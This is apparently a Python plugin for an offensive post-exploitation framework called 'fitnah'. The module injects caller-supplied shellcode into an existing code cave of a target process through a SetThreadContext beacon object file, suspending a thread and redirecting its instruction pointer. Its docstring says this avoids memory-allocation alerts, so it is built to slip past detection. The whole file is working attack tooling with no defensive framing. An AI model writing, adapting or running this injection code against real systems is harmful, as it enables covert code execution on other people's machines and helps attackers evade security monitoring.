"""execution/code_cave_inject — code cave shellcode injection via SetThreadContext BOF. MITRE T1574

BOF: TrustedSec setthreadcontext (CS-Remote-OPs-BOF)
Args: "ib" — int32 pid, bytes shellcode
Suspends a thread in target process, writes shellcode to a code cave (zero-padded
PE section space), sets RIP to the cave, resumes. No new allocation — uses existing
mapped memory so MEM_PRIVATE alerts are avoided.
"""
import base64
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre


class CodeCaveInject(BasePlugin):
    NAME        = "code_cave_inject"
    DESCRIPTION = "Inject shellcode into existing PE code cave via SetThreadContext BOF. No PowerShell."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1574"
    CATEGORY    = "execution"
    schema      = ParamSchema().add(
        Param("pid",           int, required=True,  help="Target PID"),
        Param("shellcode_b64", str, required=True,  help="Base64-encoded shellcode"),
    )

    @mitre("T1574")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")
        pid  = int(params["pid"])
        sc   = base64.b64decode(params["shellcode_b64"].strip())
        args = ctx.bof_pack("ib", pid, sc)
        r    = ctx.bof("setthreadcontext", args_b64=args, timeout=30)
        if r["status"] != "ok":
            return ModuleResult.err(f"code_cave_inject failed: {r['output']}")
        return ModuleResult.ok(data=r["output"])
